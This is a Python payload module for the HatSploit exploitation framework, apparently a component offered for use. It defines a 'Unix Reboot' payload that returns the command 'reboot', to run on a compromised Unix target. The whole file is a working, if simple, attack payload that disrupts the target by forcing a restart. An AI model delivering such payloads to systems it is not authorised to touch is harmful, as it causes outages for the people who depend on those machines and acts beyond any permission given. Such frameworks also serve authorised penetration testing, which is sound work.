#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.payload import Payload


class HatSploitPayload(Payload):
    details = {
        'Category': "single",
        'Name': "Unix Reboot",
        'Payload': "unix/generic/reboot",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Reboot payload for unix.",
        'Architecture': "generic",
        'Platform': "unix",
        'Rank': "low",
        'Type': "one_side"
    }

    def run(self):
        payload = "reboot"

        return payload
